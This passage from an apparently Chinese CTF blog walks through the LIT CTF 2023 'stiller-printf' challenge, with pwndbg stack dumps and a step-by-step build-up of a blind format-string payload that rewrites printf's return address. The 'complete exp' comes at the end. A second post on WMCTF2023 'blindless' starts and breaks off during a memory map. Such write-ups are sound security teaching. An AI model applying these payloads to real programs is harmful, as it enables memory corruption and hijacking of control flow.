class="number">0x7ffed951a5f8</span> —▸ <span class="number">0x7ffed951a6e8</span> —▸ <span class="number">0x7ffed951b0dc</span> ◂— <span class="string">&#x27;./stiller-printf1&#x27;</span></span><br><span class="line"><span class="number">27</span>:<span class="number">0138</span>│     <span class="number">0x7ffed951a600</span> —▸ <span class="number">0x7ffed951a6e8</span> —▸ <span class="number">0x7ffed951b0dc</span> ◂— <span class="string">&#x27;./stiller-printf1&#x27;</span></span><br><span class="line"><span class="number">28</span>:<span class="number">0140</span>│  <span class="number">0x7ffed951a608</span> ◂— <span class="number">0x40538a8863c3a102</span></span><br><span class="line"><span class="number">29</span>:<span class="number">0148</span>│  <span class="number">0x7ffed951a610</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">2</span>a:<span class="number">0150</span>│  <span class="number">0x7ffed951a618</span> —▸ <span class="number">0x7ffed951a6f8</span> —▸ <span class="number">0x7ffed951b0ee</span> ◂— <span class="string">&#x27;LC_NUMERIC=zh_CN.UTF-8&#x27;</span></span><br><span class="line"><span class="number">2b</span>:<span class="number">0158</span>│  <span class="number">0x7ffed951a620</span> —▸ <span class="number">0x56406778cd90</span> —▸ <span class="number">0x56406778a1c0</span> ◂— endbr64 </span><br><span class="line"><span class="number">2</span>c:<span class="number">0160</span>│  <span class="number">0x7ffed951a628</span> —▸ <span class="number">0x7fc034fb1020</span> (_rtld_global) —▸ <span class="number">0x7fc034fb22e0</span> —▸ <span class="number">0x564067789000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"><span class="number">2</span>d:<span class="number">0168</span>│  <span class="number">0x7ffed951a630</span> ◂— <span class="number">0xbfae382b2801a102</span></span><br><span class="line"><span class="number">2</span>e:<span class="number">0170</span>│  <span class="number">0x7ffed951a638</span> ◂— <span class="number">0xbfd3e33a8a49a102</span></span><br><span class="line"><span class="number">2f</span>:<span class="number">0178</span>│  <span class="number">0x7ffed951a640</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">30</span>:<span class="number">0180</span>│  <span class="number">0x7ffed951a648</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">31</span>:<span class="number">0188</span>│  <span class="number">0x7ffed951a650</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">32</span>:<span class="number">0190</span>│  <span class="number">0x7ffed951a658</span> —▸ <span class="number">0x7ffed951a6e8</span> —▸ <span class="number">0x7ffed951b0dc</span> ◂— <span class="string">&#x27;./stiller-printf1&#x27;</span></span><br><span class="line"><span class="number">33</span>:<span class="number">0198</span>│  <span class="number">0x7ffed951a660</span> —▸ <span class="number">0x7ffed951a6e8</span> —▸ <span class="number">0x7ffed951b0dc</span> ◂— <span class="string">&#x27;./stiller-printf1&#x27;</span></span><br><span class="line"><span class="number">34</span>:<span class="number">01</span>a0│  <span class="number">0x7ffed951a668</span> ◂— <span class="number">0xb5e79ed3527f8200</span></span><br><span class="line"><span class="number">35</span>:<span class="number">01</span>a8│  <span class="number">0x7ffed951a670</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">36</span>:<span class="number">01b</span>0│  <span class="number">0x7ffed951a678</span> —▸ <span class="number">0x7fc034d975c9</span> (__libc_start_main+<span class="number">137</span>) ◂— mov    r15, qword ptr [rip + <span class="number">0x1d29a0</span>]</span><br><span class="line"><span class="number">37</span>:<span class="number">01b</span>8│  <span class="number">0x7ffed951a680</span> —▸ <span class="number">0x56406778a295</span> ◂— endbr64 </span><br><span class="line"><span class="number">38</span>:<span class="number">01</span>c0│  <span class="number">0x7ffed951a688</span> —▸ <span class="number">0x56406778cd90</span> —▸ <span class="number">0x56406778a1c0</span> ◂— endbr64 </span><br><span class="line"><span class="number">39</span>:<span class="number">01</span>c8│  <span class="number">0x7ffed951a690</span> —▸ <span class="number">0x7fc034fb22e0</span> —▸ <span class="number">0x564067789000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"><span class="number">3</span>a:<span class="number">01</span>d0│  <span class="number">0x7ffed951a698</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">3b</span>:<span class="number">01</span>d8│  <span class="number">0x7ffed951a6a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">3</span>c:<span class="number">01e0</span>│  <span class="number">0x7ffed951a6a8</span> —▸ <span class="number">0x56406778a120</span> ◂— endbr64 </span><br><span class="line"><span class="number">3</span>d:<span class="number">01e8</span>│  <span class="number">0x7ffed951a6b0</span> —▸ <span class="number">0x7ffed951a6e0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">3</span>e:<span class="number">01f</span>0│  <span class="number">0x7ffed951a6b8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">3f</span>:<span class="number">01f</span>8│  <span class="number">0x7ffed951a6c0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">40</span>:<span class="number">0200</span>│     <span class="number">0x7ffed951a6c8</span> —▸ <span class="number">0x56406778a145</span> ◂— hlt    </span><br><span class="line"><span class="number">41</span>:<span class="number">0208</span>│     <span class="number">0x7ffed951a6d0</span> —▸ <span class="number">0x7ffed951a6d8</span> ◂— <span class="number">0x38</span> <span class="comment">/* &#x27;8&#x27; */</span></span><br><span class="line"><span class="number">42</span>:<span class="number">0210</span>│     <span class="number">0x7ffed951a6d8</span> ◂— <span class="number">0x38</span> <span class="comment">/* &#x27;8&#x27; */</span></span><br><span class="line"><span class="number">43</span>:<span class="number">0218</span>│     <span class="number">0x7ffed951a6e0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">44</span>:<span class="number">0220</span>│ rbx <span class="number">0x7ffed951a6e8</span> —▸ <span class="number">0x7ffed951b0dc</span> ◂— <span class="string">&#x27;./stiller-printf1&#x27;</span></span><br><span class="line"><span class="number">45</span>:<span class="number">0228</span>│     <span class="number">0x7ffed951a6f0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">46</span>:<span class="number">0230</span>│ r13 <span class="number">0x7ffed951a6f8</span> —▸ <span class="number">0x7ffed951b0ee</span> ◂— <span class="string">&#x27;LC_NUMERIC=zh_CN.UTF-8&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>合适的指针链如下：<ul>
<li>0x7ffed951a5f8（43） -&gt; 0x7ffed951a6e8（73）</li>
<li>0x7ffed951a618（47） -&gt; 0x7ffed951a6f8（75）</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; fmtarg <span class="number">0x7ffed951a5f8</span></span><br><span class="line">The index of format argument : <span class="number">44</span> (<span class="string">&quot;\%43$p&quot;</span>)</span><br><span class="line">pwndbg&gt; fmtarg <span class="number">0x7ffed951a618</span></span><br><span class="line">The index of format argument : <span class="number">48</span> (<span class="string">&quot;\%47$p&quot;</span>)</span><br><span class="line">pwndbg&gt; fmtarg <span class="number">0x7ffed951a658</span></span><br><span class="line">The index of format argument : <span class="number">56</span> (<span class="string">&quot;\%55$p&quot;</span>)</span><br><span class="line">pwndbg&gt; fmtarg <span class="number">0x7ffed951a6e8</span></span><br><span class="line">The index of format argument : <span class="number">74</span> (<span class="string">&quot;\%73$p&quot;</span>)</span><br><span class="line">pwndbg&gt; fmtarg <span class="number">0x7ffed951a6f8</span></span><br><span class="line">The index of format argument : <span class="number">76</span> (<span class="string">&quot;\%75$p&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>后续的操作参考了如下博客：<a target="_blank" rel="noopener" href="https://eth007.me/blog/ctf/stiller-printf/">LIT CTF 2023 - stiller-printf - Yet another format string to rule them all - Ethan’s Blog (eth007.me)</a> </p>
<p>为了利用指针链，首先我们需要将覆盖指针链的后2字节，使其指向 printf 的返回地址</p>
<p>首先需要了解一个技巧：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%*c\n&quot;</span>, <span class="number">0x31</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%*c\n&quot;</span>, <span class="number">0x32</span>, <span class="string">&#x27;b&#x27;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%*1$c\n&quot;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%*2$c\n&quot;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%*3$c\n&quot;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./test            </span><br><span class="line">                                                a</span><br><span class="line">                                                 b</span><br><span class="line">                                                <span class="number">1</span></span><br><span class="line">                                                 <span class="number">1</span></span><br><span class="line">                                                  <span class="number">1</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>%*c</code>：读取后续相邻的2个参数，第1个参数作为对其值，第2个参数作为数据</li>
<li><code>%*n$c</code>：读取后续第1，n个参数，第n个参数作为对其值，第1个参数作为数据</li>
</ul>
<p>分析以下 payload：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%*c</span><br></pre></td></tr></table></figure>
<ul>
<li>42个 <code>%c</code>，1个 <code>%*c</code>，因此第43个参数就会作为对其值（这里存放了 0x7ffed951a6e8）</li>
<li>因此整个 payload 的对其值为：0x7ffed951a6e8 + 42</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance <span class="number">0x7ffed951a6e8</span> <span class="number">0x7ffed951a4c8</span></span><br><span class="line"><span class="number">0x7ffed951a6e8</span>-&gt;<span class="number">0x7ffed951a4c8</span> is <span class="number">-0x220</span> bytes (<span class="number">-0x44</span> words)</span><br></pre></td></tr></table></figure>
<ul>
<li>对该 payload 进行变形，使对其值为 0x7ffed951a4c8 + 0x10000 * n（printf 的返回地址），我们只需要利用后4位的值，因此n的值不重要</li>
<li>假设 n = 1 可以进行如下的计算：<ul>
<li><code>-0x220 % 0x10000 = 0xfde0</code></li>
<li><code>0xfde0 - 41 = 64951</code></li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%<span class="number">64951</span>c%*c</span><br></pre></td></tr></table></figure>
<p>为了覆盖指针链的后2字节，可以得出如下 payload：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%<span class="number">64949</span>c%*c%c%c%hn</span><br></pre></td></tr></table></figure>
<ul>
<li>新添加两个 <code>%c</code> 导致第47个参数成为 <code>%hn</code> 修改的对象，即是 <code>0x7ffed951a618</code></li>
<li>由于 <code>0x7ffed951a618(47)</code> 指向 <code>0x7ffed951a6f8(75)</code>，索引75会间接指向 printf 的返回地址（此时修改索引75即可修改 printf 的返回地址）</li>
</ul>
<p>然后写入如下 payload 修改 printf 的返回地址：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%<span class="number">64949</span>c%*c%c%c%hn%<span class="number">133</span>c%<span class="number">75</span>$hhn</span><br></pre></td></tr></table></figure>
<ul>
<li>可以使用 GDB 配合 <code>r &gt;/dev/null</code> 命令进行调试</li>
<li>由于栈的随机化较大，因此 <code>%*c</code> 会写入随机大小的对其值，<code>%133c</code> 正是其中一种情况的解（爆破概率为 1/16）</li>
</ul>
<p>虽然 <code>%*c</code> 的值是随机的，但我们可以通过再添加15个 <code>%*43$c</code> 的方法使其末尾一字节为 <code>\x00</code>（共16个 <code>%*43$c</code>）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%<span class="number">64949</span>c%*c%c%c%hn%*<span class="number">43</span>$c%*<span class="number">43</span>$c%*<span class="number">43</span>$c%*<span class="number">43</span>$c%*<span class="number">43</span>$c%*<span class="number">43</span>$c%*<span class="number">43</span>$c%*<span class="number">43</span>$c%*<span class="number">43</span>$c%*<span class="number">43</span>$c%*<span class="number">43</span>$c%*<span class="number">43</span>$c%*<span class="number">43</span>$c%*<span class="number">43</span>$c%*<span class="number">43</span>$c%<span class="number">8</span>c%<span class="number">75</span>$hhn</span><br></pre></td></tr></table></figure>
<ul>
<li>这在理论上应该有效，但是当针对程序运行时每次都会过早退出</li>
</ul>
<p>这里作者给出了原因：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">done_add_func</span> <span class="params">(<span class="keyword">size_t</span> length, <span class="keyword">int</span> done)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (done &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> done;</span><br><span class="line">  <span class="keyword">int</span> ret;</span><br><span class="line">  <span class="keyword">if</span> (INT_ADD_WRAPV (done, length, &amp;ret))</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (EOVERFLOW);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这是负责管理 %n 计数器的函数，done 变量是 printf 的 %n 的计数器</li>
<li>当它检测到整数溢出时，printf 将退出，并且由于使用了 int 数据类型</li>
<li>当我们尝试打印太多时，printf 将过早退出</li>
</ul>
<p>测试案例如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">long</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> b = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%*1$c%2$lln\n&quot;</span>, <span class="number">0x80000000</span>, &amp;a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%*1$c%2$lln\n&quot;</span>, <span class="number">0x70000000</span>, &amp;b);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;a:0x%lx\nb:0x%lx\n&quot;</span>, a,b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">0x0</span></span><br><span class="line">b:<span class="number">0x70000000</span></span><br></pre></td></tr></table></figure>
<ul>
<li>由于第一个 printf 触发了整数溢出，导致赋值失败</li>
</ul>
<p>这里作者给出的解决办法是：利用另一条指针链进行间接修改</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%<span class="number">64949</span>c%*c%c%c%hn%c%c%c%c%c%c%c%<span class="number">545</span>c%hn%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%hhn</span><br></pre></td></tr></table></figure>
<ul>
<li>往索引56中写入 0xa6f0，间接导致索引73也指向索引74（0x7ffed951a6f0），该索引的初始值为“0”，将其写入 15 次之后依然较小</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%<span class="number">64949</span>c%*c%c%c%hn%c%c%c%c%c%c%c%<span class="number">545</span>c%hn%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%hhn%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%<span class="number">8</span>c%<span class="number">75</span>$hhn</span><br></pre></td></tr></table></figure>
<ul>
<li>往索引73中写入 <code>0xa6f0+6</code>，此时索引74中的值变为 <code>0xa6f0+6</code>，该索引中的值较小，覆写15次也不会造成整数溢出</li>
<li>最后修改索引75即可修改 printf 的返回地址</li>
</ul>
<p>目前唯一的问题就是，该 payload 较长，超出了题目的限制：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">len</span>(<span class="string">&quot;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%64949c%*c%c%c%hn%c%c%c%c%c%c%c%545c%hn%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%hhn%*74$c%*74$c%*74$c%*74$c%*74$c%*74$c%*74$c%*74$c%*74$c%*74$c%*74$c%*74$c%*74$c%*74$c%*74$c%8c%75$hhn&quot;</span>)</span><br><span class="line"><span class="number">257</span></span><br></pre></td></tr></table></figure>
<p>可以做出如下调整：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%<span class="number">64949</span>c%*c%c%c%hn%c%c%c%c%c%c%c%<span class="number">545</span>c%hn%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%hhn%*c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%<span class="number">8</span>c%<span class="number">75</span>$hhn</span><br></pre></td></tr></table></figure>
<ul>
<li>将第一个 <code>%*74$c</code> 修改为 <code>%*c</code> 可以节约几字节的空间</li>
</ul>
<p>完整 exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%<span class="number">64949</span>c%*c%c%c%hn%c%c%c%c%c%c%c%<span class="number">545</span>c%hn%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%hhn%*c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%*<span class="number">74</span>$c%<span class="number">8</span>c%<span class="number">75</span>$hhn</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/04/WMCTF2023/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/09/04/WMCTF2023/" class="post-title-link" itemprop="url">WMCTF2023</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-09-04 21:47:10 / Modified: 21:48:42" itemprop="dateCreated datePublished" datetime="2023-09-04T21:47:10+08:00">2023-09-04</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>9k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>8 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="blindless"><a href="#blindless" class="headerlink" title="blindless"></a>blindless</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>)</span> stable release version 2.31.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">main: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">8</span>edd548324d994d7d9ceaba18aea6a9f0daf7c7c, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, with debug_info, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p>提示文件如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">    <span class="number">0x5625ff3e2000</span>     <span class="number">0x5625ff3e3000</span> r--p     <span class="number">1000</span> <span class="number">0</span>      /home/ctf/pwn</span><br><span class="line">    <span class="number">0x5625ff3e3000</span>     <span class="number">0x5625ff3e4000</span> r-xp     <span class="number">1000</span> <span class="number">1000</span>   /home/ctf/pwn</span><br><span class="line">    <span class="number">0x5625ff3e4000</span>     <span class="number">0x5625ff3e5000</span> r--p     <span class="number">1000</span> <span class="number">2000</span>   /home/ctf/pwn</span><br><span class="line">    <span class="number">0x5625ff3e5000</span>     <span class="number">0x5625ff3e6000</span> r--p     <span class="number">1000</span> <span class="number">2000</span>   /home/ctf/pwn</span><br><span class="line">    <span class="number">0x5625ff3e6000</span>     <span class="number">0x5625ff3e7000</span> rw-p     <span class="number">1000</span> <span class="number">3000</span>   /home/ctf/pwn</span><br><span class="line">    <span class="number">0x5625ff6b3000</span>     <span class="number">0x5625ff6d4000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [heap]</span><br><span class="line">    <span class="number">0x7f2a72e98000</span>     <span class="number">0x7f2a72f99000</span> rw-p   <span class="number">101000</span> <span class="number">0</span>      [anon_7f2a72e98]</span><br><span class="line">    <span class="number">0x7f2a72f99000</span>     <span class="number">0x7f2a72fbb000</span> r--p    <span class="number">22000</span> <span class="number">0</span>      /home/ctf/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a72fbb000</span>     <span class="number">0x7f2a73133000</span> r-xp   <span class="number">178000</span> <span class="number">22000</span>  /home/ctf/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a73133000</span>     <span class="number">0x7f2a73181000</span> r--p    <span class="number">4e000</span> <span class="number">19</span>a000 /home/ctf/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a73181000</span>     <span class="number">0x7f2a73185000</span> r--p     <span class="number">4000</span> <span class="number">1e7000</span> /home/ctf/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a73185000</span>     <span class="number">0x7f2a73187000</span> rw-p     <span class="number">2000</span> <span class="number">1</span>eb000 /home/ctf/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a73187000</span>     <span class="number">0x7f2a7318d000</span> rw-p     <span class="number">6000</span> <span class="number">0</span>      [anon_7f2a73187]</span><br><span class="line">    <span class="number">0x7f2a7318d000</span>     <span class="number">0x7f2a7318e000</span> r--p     <span class="number">1000</span> <span class="number">0</span>      /home/ctf/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a7318e000</span>     <span class="number">0x7f2a731b1000</span> r-xp    <span class="number">23000</span> <span class="number">1000</span>   /home/ctf/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a731b1000</span>     <span class="number">0x7f2a731b9000</span> r--p     <span class="number">8000</span> <span class="number">24000</span>  /home/ctf/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a731ba000</span>     <span class="number">0x7f2a731bb000</span> r--p     <span class="number">1000</span> <span class="number">2</span>c000  /home/ctf/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a731bb000</span>     <span class="number">0x7f2a731bc000</span> rw-p     <span class="number">1000</span> <span 